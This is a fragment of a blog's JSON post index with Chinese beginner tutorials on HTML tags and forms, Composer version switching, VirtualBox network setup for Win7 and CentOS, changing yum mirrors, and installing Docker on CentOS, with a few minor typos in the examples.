<td>1</td>\n   <td>1</td>\n   <td>1</td>\n</tr>\n</table>\n```\n\n**换行标签br**\n\n```html\n<br />\n```\n\n**换行线标签hr**\n\n```html\n<hr />\n```\n\n**div标签和span标签**\n\ncss中会经常使用div\n\n```html\n<div>1</div>\n<span>1/span>\n```\n\n|                 |          | 区别                                  |\n| --------------- | -------- | ------------------------------------- |\n| `<div></div>`   | div标签  | 用来布局的，但是现在一行只能放一个div |\n| `<span></span>` | span标签 | 用来布局的，一行上可以放好多个span    |\n\n## 文本属性\n\n**加粗标签**\n\n```html\n<b>加粗1</b>\n<strong>加粗2</strong>\nb 只是加粗 strong 除了可以加粗还有 强调的意思， 语义更强烈。\n```\n\n**斜体标签i**\n\n```\n<i>111</i>\n```\n\n**下划线标签u**\n\n```\n<u>1</u>\n```\n\n**上标线标签sup**\n\n```html\n<sup>上标线</sup>\n```\n\n**下标线标签sub**\n\n```html\n<sub>下标线</sub>\n```\n\n**删除线标签del**\n\n```html\n<del>111</del>\n```\n\n**font标签**\n\n> 作用：规定字体属性\n>\n> size 字体的大小\n>\n> color 字体颜色\n\n```html\n<font size=\"10\" color=\"red\">111</font>\n```\n\n**pre标签**\n\n> 作用：保留文本原来的格式\n\n```\n<pre>\n11111111 11111111\n1111111\n11\n</pre>\n```\n\n**code标签**\n\n> 作用：保留文本的格式在同一行上输出/显示\n\n```html\n<code>\n11 1 1 1 1\n111 1 1 1\n</code>\n```\n\n\n\n## input标签\n\n**type属性**\n\n> type=\"text\" 文本框\n>\n> eg: `<input type=\"text\" value=\"\" />`\n>\n> type=\"password\" 密码框\n>\n> eg: `<input type=\"password\" name=\"password\" value=\"\" />`\n>\n> type=\"submit\" 提交按钮\n>\n> eg: `<input type=\"submit\" value=\"提交\" />`\n>\n> type=\"reset\" 重置按钮\n>\n> eg: `<input type=\"reset\" value=\"重置\" />`\n>\n> type=\"file\" 文件上传域\n>\n> eg: `<input type=\"file\" />`\n>\n> type=\"hidden\" 隐藏域,不显示出来\n>\n> eg:`<input type=\"hidden\" name=\"tokne\" value=\"aaaaaaa1\" />` //有token可以防止csrf漏洞\n>\n> type=\"button\" 普通按钮\n>\n> eg：`<input type=\"button\" name=\"\" value=\"11\" onclick=\"xx\"/>` //一般配合onclick调用其他函数重复提交使用\n>\n> type=\"checkbox\" 复选框\n>\n> eg:\n>\n> `男 <input type=\"checkbox\" />`\n>\n> `女 <input type=\"checkbox\" />`\n>\n> type=\"radio\" 单选框\n>\n> eg: `<input type=\"radio\"/>`\n\n **size属性**\n\n> 设置框的长度，属性值 正整数\n>\n> 例子：`<input type=\"text\" name=\"111\" size=\"10\"/>`\n\n**name属性**\n\n> name属性一般给服务器接收使用的(十分重要,要是没有name属性和值,服务器就接受不到信息)\n>\n> 例子：`<input type=\"text\" name=\"text\"/>`\n\n**maxlength属性**\n\n> 设置输入的字符长度，属性值 正整数\n>\n> 例子：`<input type=\"text\" name=\"111\" maxlength=\"10\"/>` 限制输入字符长度为10\n\n**value属性**\n\n> 设置默认值\n>\n> eg: `<input type=\"text\" value=\"admin\"/>`\n\n**readonly属性**\n\n> 作用: 只能显示不能修改\n>\n> Eg: `<input type=\"text\" readonly/>`\n\n```html\n<form method=\"POST\" action=\"\" enctype=\"application/x-www-form-urlencoded\">\n账号:<input type=\"text\" name=\"username\" /><br />\n密码:<input type=\"password\" name=\"password\"/><br />\n<input type=\"submit\" value=\"提交\"/>\n<input type=\"reset\" value=\"重置\"/>\n</form>\n```\n\n\n\n## form表单\n\nmethod属性 可以设置提交的方法有 GET,POST \n\n> (登录和提交账号密码用post,提交搜信息使用get)\n>\n> 属性值有：\n>\n> post 不会在浏览器显示出来\n>\n> get 不会在浏览器显示出来\n\naction属性 设置提交的地方\n\n> 属性值 自定义\n>\n> action=\"\" 属性为空时,提交的地方就是本页面\n\n\n\nenctype属性 规定form表单的编码\n\n> 属性值有\n>\n> application/x-www-form-urlencoded //普通表单默认使用，url编码\n>\n> multipart/form-data //上传文件时候使用\n>\n> text/plain //不用进行编码使用这个\n\n文件上传\n\n```html\n<from method=\"POST\" action=\"\" enctype=\"multipart/form-data\">\n<input type=\"file\" />\n<input type=\"submit\" value=\"提交\" />\n</form>\n```\n\n搜索框\n\n```html\n<from method=\"POST\" action=\"\" enctype=\"application/x-www-form-urlencoded\">\n<input type=\"text\" name=\"search\" />\n<input type=\"submit\" value=\"提交\" />\n</form>\n```\n\n## html特殊表单标签\n\n### 下拉列表\n\n> `<select>`标签定义了下拉选项列表\n>\n> `<select>`中的`<option>`标签定义列表中的可用选项\n>\n> 在option 中定义 selected=\"selectde\"时，当前选项即为默认选项\n\nselected属性\n\n> 作用：设置选项为默认选项\n>\n> 属性值 selected eg: `<option selected=\"selected\"></option>`\n\n```html\n<select>\n   <option value=\"1\">Apple</option>\n   <option value=\"2\">Banana</option>\n   <option value=\"3\">Orange</option>\n   <option selected=\"selected\" value=\"4\">red</option>\n</select>\n```\n\n### **文本域textarea**\n\n> cols、rows属性分别规定了文本区域内可见的宽度和高度。\n>\n> cols 每行的字符数\n>\n> rows 显示的行数\n\n```html\n<textarea rows=\"30\" cols=\"10\" name=\"info\"></textarea>\n<input type=\"submit\" value=\"提交\">\n```\n\n### **fieldset标签**\n\n> `<fieldset>` 标签定义了一组相关的表单元素，并使用外框包含起来。\n>\n> `<legend>` 标签定义了`<fieldset>`元素的标题。\n\n```html\n<form>\n    <fieldset>\n        <legend>\n            Author: \n        </legend>\n        Name: <input type=\"text\"><br/><br/>\n        Telephone: <input type=\"text\"><br/><br/>\n        Email: <input type=\"text\">\n    </fieldset>\n</form>\n```\n\n案例-个人信息\n\n```html\n<fieldset>\n<legend>个人信息</legend>\n<form method=\"post\" enctype=\"application/x-www-form-urlenxoded\">\n用户名<input type=\"text\" /><br />\n性别<input type=\"radio\" name=\"sex\" value=\"1\"/>男<input type=\"radio\" name=\"sex\" value=\"1\"/>女<br />\n喜欢语言<input type=\"checkbox\" name=\"app[]\" value=\"asp\"/>asp<input type=\"checkbox\" name=\"app[]\" value=\"php\"/>php<br />\n地区<select name=\"address\">\n   <option value=\"shai\">上海</option>\n   <option value=\"bj\">北京</option>\n   <option value=\"sz\">深圳</option>\n   <option value=\"gz\">广州</option>\n</select>\n<br />\n简介<br />\n<textarea cols=\"30\" rows=\"10\" name=\"info\"></textarea><br />\n<input type=\"submit\" value=\"提交\">\n</form>\n</fieldset>\n```\n\n### **内联框架iframe**\n\n> src属性 属性值 url 必要属性\n>\n> width属性 设置框架显示宽度 属性值 单位 像素值(px)/百分比\n>\n> height属性 设置框架显示高度 属性值 单位 像素值(px)/百分比\n>\n> frameborder 作用用于定义是否显示边框 默认frameborder=\"1\" 开启,frameborder=\"0\"移除边框\n\n```html\n<iframe src=\"url\" width=\"200px\" height=\"250px\" frameborder=\"1\"></iframe>\n```\n\n使用iframe 作为链接的目标(traget)\n\n> 链接的target属性必须引用iframe 的name属性\n\n示例：\n\n```html\n<iframe src=\"demo_iframe.html\" name=\"iframe_a\"></iframe>\n<p><a href=\"https://www.soso.com\" target=\"iframe_a\">aoao</a></p>\n```\n\n### **框架frameset标签**\n\nframeset标签不能在body标签内使用\n\nframe标签 一般都是跟frameset标签中使用\n\n> 属性\n>\n> cols 定义框架集中列的数目和尺寸，属性值 单位百分比\n>\n> eg: \n>\n> cols=\"50%,40%\" ---> \"上,下\"\n>\n> cols=\"50%,*\" //这个`*号`就会把剩下的百分之几给旁边\n>\n> rows 定义框架集中行的数目和尺寸，属性值 单位百分比\n>\n> eg: \n>\n> rows=\"50%,*\" //这个`*号`就会把剩下的百分之几给旁边\n>\n> rows=\"50%,40%\" -->\"左,右\"\n>\n> scrolling属性 滚动条\n>\n> scrolling=\"auto\" 在需要的情况下出现滚动条(默认)\n>\n> scrolling=\"yes\" 始终显示滚动条(即使不需要)\n>\n> scrolling=\"no\" 从不显示滚动条(即使需要)\n\n```html\n<frameset cols=\"50%,*\">\n   <frame src=\"http://bilibili.com\" scrolling=\"no\"/>\n   <frame src=\"http://www.soso.com\" />\n</frameset>\n```\n\n实战项目-后台框架\n\nindex.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n</head>\n<frameset rows=\"20%,*\">\n<frame src=\"top.html\" />\n<frameset cols=\"30%,*\">\n<frame src=\"menu.html\"/>\n<frame src=\"main.html\" name=\"c\"/>\n</frameset>\n</frameset>\n<body>\n</body>\n</html>\n```\n\ntop.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n</head>\n<body>\ntop\n</body>\n</html>\n```\n\nmain.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n</head>\n<body>\nmain\n</body>\n</html>\n```\n\nmenu.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n</head>\n<body>\n<li><a href=\"add_news.html\" target=\"c\">增加文章</a></li>\n<li><a href=\"#\">系统信息</a></li>\n<li><a href=\"#\">安全设置</a></li>\n</body>\n</html>\n```\n\nadd_news.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n</head>\n<body>\n<form method=\"post\">\n文章标题<input type=\"text\" name=\"title\" /><br />\n文章内容<textarea cols=\"30\" rows=\"20\"></textarea><br />\n<input type=\"submit\" value=\"提交\" />\n</form>\n</body>\n</html>\n```\n\n","categories":["html"]},{"title":"composer 回退版本，切换版本","url":"/composer-self-update/","content":"\n查看composer当前版本\n\n<!-- more -->\n\n```bash\ncomposer -v\n```\n\n要回滚到composer版本1，执行以下命令\n\n```bash\ncomposer self-update --1\n```\n\n当您想回到版本2时（在更新或删除不兼容的插件之后，您应该这样做）\n\n```\ncomposer self-update --2\n```\n\n切换到指定版本\n\n```\ncomposer self-update 2.3.0\n```\n\n","categories":["PHP"]},{"title":"VirtualBox Win7配置网络","url":"/vbox-win7-Configure-the-network/","content":"\n> 安装好win7虚拟机后设置两张网卡\n\n<!-- more -->\n\n1.网卡设置两张网卡，一张`(网络地址转换(NAT))`，一张`(仅主机(Host-Only)网络`\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/cnetwork.png\" style=\"zoom:67%;\" />\n\nNAT网卡 默认设置 ,当只有NAT网卡时\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/cwin71.png\" style=\"zoom: 80%;\" />\n\n执行命令查询NAT的ip\n\n> ipconfig //查询ip\n\n```\nC:\\Users\\host>ipconfig\n\nWindows IP 配置\n\n\n以太网适配器 本地连接:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::258c:c859:c2e1:8da1%11\n   IPv4 地址 . . . . . . . . . . . . : 10.0.2.15\n   子网掩码  . . . . . . . . . . . . : 255.255.255.0\n   默认网关. . . . . . . . . . . . . : 10.0.2.2\n\n隧道适配器 isatap.{08C3B1BA-50AA-4CA1-800F-05354168A29B}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开\n   连接特定的 DNS 后缀 . . . . . . . :\n```\n\n查看一下适配器，`本地连接`这个就是NAT网卡的适配器\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/cwin72.png\" style=\"zoom:80%;\" />\n\n我们发现他的ip是内部网络的ip了，所以就不需要配置了\n\n\n\nHost-Only网卡 设置局域网 //重点\n\n> 当有NAT网卡和网卡时\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/cnetwork.png\" style=\"zoom:67%;\" />\n\n执行命令查询ip\n\n> ipconfig //查询ip\n\n```\nC:\\Users\\host>ipconfig\n\nWindows IP 配置\n\n\n以太网适配器 本地连接 2:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::8cac:c593:473d:51c1%18\n   自动配置 IPv4 地址  . . . . . . . : 169.254.81.193\n   子网掩码  . . . . . . . . . . . . : 255.255.0.0\n   默认网关. . . . . . . . . . . . . :\n\n以太网适配器 本地连接:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::258c:c859:c2e1:8da1%11\n   IPv4 地址 . . . . . . . . . . . . : 10.0.2.15\n   子网掩码  . . . . . . . . . . . . : 255.255.255.0\n   默认网关. . . . . . . . . . . . . : 10.0.2.2\n\n隧道适配器 isatap.{08C3B1BA-50AA-4CA1-800F-05354168A29B}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开\n   连接特定的 DNS 后缀 . . . . . . . :\n\n隧道适配器 isatap.{88D224A7-F4E2-48F0-AD18-B98425E88895}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开\n   连接特定的 DNS 后缀 . . . . . . . :\n```\n\n我们发现多出了一个`本地连接2`，而这个`本地连接2`就是我们的`Host-Only网卡`\n\n我们来到`控制面板`-->`点击网络和Internet`-->`点击网络和共享中心`-->`点左侧的适配器设置`\n\n我们来到适配器页面可以看到两个适配器，本地连接是`NAT网卡的` 本地连接2是`Host-Only网卡的`\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/cwin73.png\"  style=\"zoom:80%;\" />\n\n我们点击`本地连接2` 右键选择`属性`,点击`Internet协议版本4(TCP/IPV4)`--->点击属性\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/image-20220416115725522.png\" style=\"zoom:67%;\" />\n\n选择 `使用下面的IP地址`，按照我下面的例子填写 ,点`确定`-->点`关闭` 等几分钟\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/cwin75.png\" style=\"zoom:67%;\" />\n\n\n\n在cmd命令行执行 `ipconfig` 查询一下ip\n\n```\nC:\\Users\\host>ipconfig\n\nWindows IP 配置\n\n\n以太网适配器 本地连接 2:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::8cac:c593:473d:51c1%18\n   IPv4 地址 . . . . . . . . . . . . : 192.168.1.88\n   子网掩码  . . . . . . . . . . . . : 255.255.255.0\n   默认网关. . . . . . . . . . . . . : 192.168.1.80\n\n以太网适配器 本地连接:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::258c:c859:c2e1:8da1%11\n   IPv4 地址 . . . . . . . . . . . . : 10.0.2.15\n   子网掩码  . . . . . . . . . . . . : 255.255.255.0\n   默认网关. . . . . . . . . . . . . : 10.0.2.2\n\n隧道适配器 isatap.{08C3B1BA-50AA-4CA1-800F-05354168A29B}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开\n   连接特定的 DNS 后缀 . . . . . . . :\n\n隧道适配器 isatap.{88D224A7-F4E2-48F0-AD18-B98425E88895}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开\n   连接特定的 DNS 后缀 . . . . . . . :\n```\n\n可以看到Host-Only网卡-->`本地连接2` 的ip已经变为我们设置的局域网ip了\n\n如果需要物理机访问到虚拟机搭建的网站，需要**关闭防火墙**","categories":["VirtualBox"]},{"title":"VirtualBox Centos配置网络","url":"/vbox-centos-Configure-the-network/","content":"\n> 前提提示，请在启动centos安装前设置好这两张网卡\n\n<!-- more -->\n\n1.网卡设置两张网卡，一张NAT,一张Host-Only\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/cnetwork.png\" style=\"zoom:67%;\" />\n\n\n\n记住NAT网卡的MAC地址，十分重要\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/cnetwork2.png\" style=\"zoom:67%;\" />\n\n\n\n记住Host-Only网卡的MAC地址，十分重要\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/cnetwork3.png\" style=\"zoom:67%;\" />\n\n\n\nNAT网卡 设置成内部网络\n\nHost-Only网卡 设置局域网\n\n\n\n查看网卡名称，我们主要是根据mac地址来确认网卡名称的\n\n> 执行 ip ad \n\n```bash\n[root@localhost key]# ip ad\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000\n    link/ether 08:00:27:a7:6a:f1 brd ff:ff:ff:ff:ff:ff\n    inet 10.0.2.15/24 brd 10.0.2.255 scope global noprefixroute dynamic enp0s3\n       valid_lft 81864sec preferred_lft 81864sec\n    inet6 fe80::a00:27ff:fea7:6af1/64 scope link \n       valid_lft forever preferred_lft forever\n3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000\n    link/ether 08:00:27:31:25:b3 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.1.88/24 brd 192.168.1.255 scope global noprefixroute enp0s8\n       valid_lft forever preferred_lft forever\n    inet6 fe80::a00:27ff:fe31:25b3/64 scope link noprefixroute \n       valid_lft forever preferred_lft forever\n4: virbr0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen 1000\n    link/ether 52:54:00:e8:79:b9 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0\n       valid_lft forever preferred_lft forever\n5: virbr0-nic: <BROADCAST,MULTICAST> mtu 1500 qdisc pfifo_fast master virbr0 state DOWN group default qlen 1000\n    link/ether 52:54:00:e8:79:b9 brd ff:ff:ff:ff:ff:ff\n```\n\n> enp0s3 ---> NAT网卡\n>\n> enp0s8 ---> Host-Only网卡\n\n我们执行命令进入到`/etc/sysconfig/network-scripts/`目录，这目录下存放着`enp0s3`和`enp0s8`的配置文件\n\n> ifcfg-enp0s3 --> enp0s3配置文件\n>\n> ifcfg-enp0s8 --> enp0s8配置文件\n\n```bash\n[root@localhost key]# cd /etc/sysconfig/network-scripts/\n[root@localhost network-scripts]# ls\nifcfg-enp0s3  ifdown-ipv6      ifdown-tunnel  ifup-isdn    ifup-TeamPort\nifcfg-enp0s8  ifdown-isdn      ifup           ifup-plip    ifup-tunnel\nifcfg-lo      ifdown-post      ifup-aliases   ifup-plusb   ifup-wireless\nifdown        ifdown-ppp       ifup-bnep      ifup-post    init.ipv6-global\nifdown-bnep   ifdown-routes    ifup-eth       ifup-ppp     network-functions\nifdown-eth    ifdown-sit       ifup-ib        ifup-routes  network-functions-ipv6\nifdown-ib     ifdown-Team      ifup-ippp      ifup-sit\nifdown-ippp   ifdown-TeamPort  ifup-ipv6      ifup-Team\n```\n\n我们先配置NAT网卡enp0s3，执行下面的命令：\n\n> vim ifcfg-enp0s3\n>\n> 在文件内粘贴我下面的内容，\n\n```\nDEVICE=enp0s3\nHWADDR=08:00:27:A7:6A:F1 //替换成你的NAT网卡的MAC地址\nTYPE=Ethernet\nPROXY_METHOD=none\nBROWSER_ONLY=no\nBOOTPROTO=dhcp\nDEFROUTE=yes\nNM_CONTROLLED=yes\nNAME=enp0s3\nUUID=4a2f939c-e560-4f1a-8c3d-16ed5c1cea1d //保留你enp0s3的UUID\nONBOOT=yes //默认是no,我们修改为yes\n```\n\n搞定之后，按`Esc` 键，再按`shift`+`:` ，输入`wq` 保存退出\n\n配置Host-Only网卡enp0s8，执行下面的命令\n\n> vim ifcfg-enp0s8\n>\n> 在文件内插入我下面的内容，\n\n```\nHWADDR=08:00:27:31:25:B3 //替换为你Host-Only网卡的mac地址\nTYPE=Ethernet\nPROXY_METHOD=none\nBROWSER_ONLY=no\nBOOTPROTO=none\nIPADDR=192.168.1.88\nGATEWAY=192.168.1.1\nNETMASK=255.255.255.0\nDEFROUTE=yes\nIPV4_FAILURE_FATAL=no\nIPV6INIT=yes\n#IPV6_AUTOCONF=yes\n#IPV6_DEFROUTE=yes\n#IPV6_FAILURE_FATAL=no\n#IPV6_ADDR_GEN_MODE=stable-privacy\nNAME=enp0s8\nUUID=470f00a3-cd71-4d9f-82a9-d6ad3f5f57b7 //保留你enp0s8的UUID\nDEVICE=enp0s8\nONBOOT=yes //默认是no,我们修改为yes\n```\n\n搞定之后，按`Esc` 键，再按`shift`+`:` ，输入`wq` 保存退出\n\n输入以下命令，重启\n\n> halt --r\n\n你可以访问外网了，但是可能ping不了百度，这时，你只需要把centos关机后，等几分钟再开启就可以成功ping通百度了\n\n物理机也可以ping通虚拟机的ip地址\n\n```\nC:\\Users\\hh>ping 192.168.1.88\n\n正在 Ping 192.168.1.88 具有 32 字节的数据:\n来自 192.168.1.88 的回复: 字节=32 时间<1ms TTL=64\n来自 192.168.1.88 的回复: 字节=32 时间=1ms TTL=64\n来自 192.168.1.88 的回复: 字节=32 时间<1ms TTL=64\n来自 192.168.1.88 的回复: 字节=32 时间=1ms TTL=64\n\n192.168.1.88 的 Ping 统计信息:\n    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，\n往返行程的估计时间(以毫秒为单位):\n    最短 = 0ms，最长 = 1ms，平均 = 0ms\n```\n\n","tags":["centos"],"categories":["Linux"]},{"title":"Centos更新yum源","url":"/centos-update-yum-yuan/","content":"\n> 更新yum源的前提是得把网络配置好，配置网络参考\n\n<!-- more -->\n\n**对当前CentOS-Base.repo进行备份**\n\n```\ncd /etc/yum.repos.d/\nmv CentOS-Base.repo CentOS-Bate.repo.back\n```\n\n**下载新的CentOS-Base.repo 到/etc/yum.repos.d/**\n\n```\nwget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo\n```\n\n**yum clean all 清除缓存，运行 yum makecache 生成新的缓存**\n\n```\nyum clean all //清理缓存\nyum makecache //生成新的缓存\n```\n\n**安装EPEL（Extra Packages for Enterprise Linux ）源**\n\n```\nyum install -y epel-release\n```\n\n**再次运行yum clean all 清除缓存，运行 yum makecache 生成新的缓存**\n\n```\nyum clean all //清理缓存\nyum makecache //生成新的缓存\n```\n\n\n\n**查看启用的yum源和所有的yum源**\n\n```\nyum repolist enabled\nyum repolist all\n```\n\n**更新yum**\n\n```\nyum -y update\n```\n\n","tags":["centos"],"categories":["linux"]},{"title":"Centos安装docker","url":"/centos7-install-docker/","content":"\n## Docker安装\n\n<!-- more -->\n\n关闭防火墙： 执行命令 systemctl stop firewalld.service\n\n1.查看内核版本 <Docker 要求 CentOS 系统的内核版本高于 3.10>\n\n  uname -r     本机<内核版本: 3.10.0-1062.el7.x86_64>\n\n2.把yum包更新到最新 **这个步骤很有必要!!**\n\n执行 **yum update**\n\n3.安装需要的软件包, yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的\n\n> sudo yum install -y yum-utils device-mapper-persistent-data lvm2\n\n4.设置yum源\n\n> sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo\n\n5.查看仓库docker版本\n\n> yum list docker-ce --showduplicates | sort -r\n\n```\n[key@localhost ~]$ yum list docker-ce --showduplicates | sort -r\n已加载插件：fastestmirror, langpacks\n可安装的软件包\n * updates: mirrors.aliyun.com\n * extras: mirrors.aliyun.com\n * epel: my.mirrors.thegigabit.com\ndocker-ce.x86_64            3:20.10.9-3.el7                     docker-ce-stable //选择最新的\ndocker-ce.x86_64            3:20.10.8-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:20.10.7-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:20.10.6-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:20.10.5-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:20.10.4-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:20.10.3-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:20.10.2-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:20.10.14-3.el7                    docker-ce-stable\ndocker-ce.x86_64            3:20.10.1-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:20.10.13-3.el7                    docker-ce-stable\ndocker-ce.x86_64            3:20.10.12-3.el7                    docker-ce-stable\ndocker-ce.x86_64            3:20.10.11-3.el7                    docker-ce-stable\ndocker-ce.x86_64            3:20.10.10-3.el7                    docker-ce-stable\ndocker-ce.x86_64            3:20.10.0-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:19.03.9-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:19.03.8-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:19.03.7-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:19.03.6-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:19.03.5-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:19.03.4-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:19.03.3-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:19.03.2-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:19.03.15-3.el7                    docker-ce-stable\ndocker-ce.x86_64            3:19.03.14-3.el7                    docker-ce-stable\ndocker-ce.x86_64            3:19.03.1-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:19.03.13-3.el7                    docker-ce-stable\ndocker-ce.x86_64            3:19.03.12-3.el7                    docker-ce-stable\ndocker-ce.x86_64            3:19.03.11-3.el7                    docker-ce-stable\ndocker-ce.x86_64            3:19.03.10-3.el7                    docker-ce-stable\ndocker-ce.x86_64            3:19.03.0-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:18.09.9-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:18.09.8-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:18.09.7-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:18.09.6-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:18.09.5-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:18.09.4-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:18.09.3-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:18.09.2-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:18.09.1-3.el7                     docker-ce-stable\ndocker-ce.x86_64            3:18.09.0-3.el7                     docker-ce-stable\ndocker-ce.x86_64            18.06.3.ce-3.el7                    docker-ce-stable\ndocker-ce.x86_64            18.06.2.ce-3.el7                    docker-ce-stable\ndocker-ce.x86_64            18.06.1.ce-3.el7                    docker-ce-stable\ndocker-ce.x86_64            18.06.0.ce-3.el7                    docker-ce-stable\ndocker-ce.x86_64            18.03.1.ce-1.el7.centos             docker-ce-stable\ndocker-ce.x86_64            18.03.0.ce-1.el7.centos             docker-ce-stable\ndocker-ce.x86_64            17.12.1.ce-1.el7.centos             docker-ce-stable\ndocker-ce.x86_64            17.12.0.ce-1.el7.centos             docker-ce-stable\ndocker-ce.x86_64            17.09.1.ce-1.el7.centos             docker-ce-stable\ndocker-ce.x86_64            17.09.0.ce-1.el7.centos             docker-ce-stable\ndocker-ce.x86_64            17.06.2.ce-1.el7.centos             docker-ce-stable\ndocker-ce.x86_64            17.06.1.ce-1.el7.centos             docker-ce-stable\ndocker-ce.x86_64            17.06.0.ce-1.el7.centos             docker-ce-stable\ndocker-ce.x86_64            17.03.3.ce-1.el7                    docker-ce-stable\ndocker-ce.x86_64            17.03.2.ce-1.el7.centos             docker-ce-stable\ndocker-ce.x86_64            17.03.1.ce-1.el7.centos             docker-ce-stable\ndocker-ce.x86_64            17.03.0.ce-1.el7.centos             docker-ce-stable\nDetermining fastest mirrors\n * base: mirrors.aliyun.com\n```\n\n6.安装docker\n\n> 执行 sudo yum install docker-ce\n\n\n\n7.启动Docker\n\n sudo systemctl start docker\n sudo systemctl enable docker //设置开机启动\n sudo systemctl stop docker  //停止Docker\n\n8.查看版本\n\n```\n[key@localhost ~]$ docker version\nClient: Docker Engine - Community\n Version:           20.10.14\n API version:       1.41\n Go version:        go1.16.15\n Git commit:        a224086\n Built:             Thu Mar 24 01:49:57 2022\n OS/Arch:           linux/amd64\n Context:           default\n Experimental:      true\nGot permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get \"http://%2Fvar%2Frun%2Fdocker.sock/v1.24/version\": dial unix /var/run/docker.sock: connect: permission denied\n```\n\n9.使用一下确认是否启动成功,使用search 查一下\n\n```\n[root@localhost key]# docker search sqlmap\nNAME                      DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED\npaoloo/sqlmap             Dockered sqlmap. Build instructions: https:/…   7                    \njdecool/sqlmap            sqlmap (Automatic SQL injection) in a contai…   4                    [OK]\ngooglesky/sqlmap          unofficial sqlmap docker image based on Cent…   4                    \nxzdbd/sqlmapapi-server    sqlmapapi-server                                1                    [OK]\nilyaglow/sqlmap           Sqlmap tool based on alpine linux image         1                    [OK]\nmarcomsousa/sqlmap        Simple image that execute Automatic SQL inje…   1                    [OK]\nvgartvichwallarm/sqlmap                                                   0                    \nsagikazarmark/sqlmap      SQLMap docker image                             0                    [OK]\nstealthc/sqlmap           Sqlmap Docker container with all optional de…   0                    [OK]\nalexandreoda/sqlmap       sqlmap via docker                               0                    \njamesmstone/sqlmap        A dockerised version of sqlmap                  0                    [OK]\nwtwver/sqlmap                                                             0                    \nwildwildangel/sqlmap      Alpine-based image to run sqlmap                0                    \nmymengyu/sqlmap           sqlmap: automatic SQL injection and database…   0                    [OK]\nchasepd/sqlmap            Run the sql injection vulnerability testing …   0                    \ntangx/sqlmap                                                              0                    \npeakkk/sqlmap             A tiny docker image for SQLMap.  This Docker…   0                    [OK]\nacgpiano/sqlmapapi        sqlmapapi server                                0                    \nevenh/sqlmap              Dockerized version of 